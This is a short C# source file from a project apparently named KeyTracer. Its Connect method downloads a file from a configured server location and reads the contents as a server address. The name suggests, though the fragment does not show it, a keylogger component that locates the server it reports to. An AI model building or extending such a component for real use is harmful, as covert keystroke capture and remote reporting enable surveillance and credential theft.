using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.IO;

namespace KeyTracer
{
    static class Internet
    {
        public static int Connect()
        {
            try
            {
                WebClient webClient = new WebClient();

                webClient.DownloadFile(Consts.serverLocation, Consts.serverPath);

                Consts.Server = File.ReadAllText(Consts.serverPath);

                return 1;
            }
            catch
            {
                return 0;
            }

        }
    }
}
